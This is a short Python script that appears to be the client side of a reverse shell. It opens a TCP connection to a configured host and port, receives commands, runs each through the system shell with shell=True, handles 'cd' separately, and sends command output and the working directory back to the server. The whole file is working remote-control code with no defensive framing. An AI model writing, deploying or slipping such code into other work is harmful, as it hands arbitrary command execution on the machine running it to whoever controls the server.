import socket
import os
import subprocess

# Constants
HOST = '127.0.0.1'
PORT = 12000

# Working area

# Create a socket
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect via the socket
clientSocket.connect((HOST, PORT))

# Begin sending and recieving data
while True:
    # Receive the command from the server
    command = clientSocket.recv(1024)

    # Decode the command
    command = command.decode()

    # Skip the ping
    if "@" in command:
        print("Server just pinged")
        continue
    

    if (command[:2] == "cd"):
        try:
            os.chdir(command[3:])
            # Get the current working directory
            currentWD = os.getcwd() + ">"

            print("Directory changed to: " + currentWD)
        except Exception as error:
            currentWD = str(error) + "\n"
        
        # Encode the data for transmission to the server
        data = str.encode(currentWD)

        # Send data to the server
        clientSocket.sendall(data)

    elif len(command) > 1:
        # Open a terminal process, run the command and store the output as well as any errors
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

        # Get the output of the command run on the terminal
        output = cmd.stdout.read() + cmd.stderr.read()

        # Change the output to string
        outputStr = str(output, 'utf-8')

        # Get the current working directory
        currentWD = os.getcwd() + ">"

        # Encode the data for transmission to the server
        data = str.encode(outputStr + currentWD)

        # Send the data to the server
        clientSocket.sendall(data)

        print(outputStr)